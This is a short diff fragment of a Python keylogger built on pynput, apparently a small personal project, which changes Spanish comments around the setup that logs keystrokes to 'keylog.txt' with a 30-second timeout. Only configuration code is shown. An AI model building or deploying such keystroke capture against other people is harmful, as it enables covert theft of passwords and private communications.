@@ -5,12 +5,12 @@ import time
 import datetime
 from pynput import keyboard
 
-# Configuración
+# Configuramos el archivo que almacenara las lecturas de teclas
 carpeta_destino = "keylog.txt"
 segundos_espera = 30
 timeout = time.time() + segundos_espera
 
-# Configuración de logging para almacenar las teclas
+# Configuración de logging 
 logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
 
 def TimeOut():
